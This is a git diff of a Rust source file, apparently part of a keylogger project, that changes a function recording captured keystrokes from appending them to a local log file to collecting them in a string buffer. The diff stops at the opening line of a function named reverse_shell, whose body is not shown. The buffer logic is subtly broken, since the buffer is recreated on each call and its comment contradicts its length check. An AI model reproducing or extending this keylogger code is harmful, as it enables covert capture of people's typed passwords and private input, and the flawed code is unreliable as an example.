@@ -9,36 +9,47 @@ use std::env;
 
 pub fn match_case(key: &Keycode) -> &'static str {
 
-    let mut file = OpenOptions::new()
-    .create(true)
-    .append(true)
-    .open("/home/oef/Documents/Github/k3ymb3d/log.txt")
-    .expect("Failed to open file");
+    //let mut file = OpenOptions::new()
+    //.create(true)
+    //.append(true)
+    //.open("/home/oef/Documents/Github/k3ymb3d/log.txt")
+    //.expect("Failed to open file");
     
+    let mut buffer = String::new();
+
+    // check if len buffer is less than 50
+    // if it is, print it buffer
+    if buffer.len() > 50 {
+        println!("{}", buffer);
+    }
+
 
     // using match expression
     match *key {
         Keycode::Space => {
             // write to file
-            file.write(b" ").expect("Failed to write to file");
+            //file.write(b" ").expect("Failed to write to file");
+            buffer.push_str(" ");
             "Space"
         }
         Keycode::Enter => {
             // write to file
-            file.write(b"\n").expect("Failed to write to file");
+            //file.write(b"\n").expect("Failed to write to file");
+            buffer.push_str("\n");
             "Enter"
         }
         Keycode::RShift | Keycode::Slash => {
             // write to file
-            file.write(b"?").expect("Failed to write to file");
+            //file.write(b"?").expect("Failed to write to file");
+            buffer.push_str("?");
             "?"
         } 
         _ => { 
-            write!(file, "{}",  key).expect("Failed to write to file");  
+            //write!(file, "{}",  key).expect("Failed to write to file");  
+            buffer.push_str(&format!("{}", key));
             "Other"
         }
-    }
-    
+    }    
 }
 
 pub fn reverse_shell() {
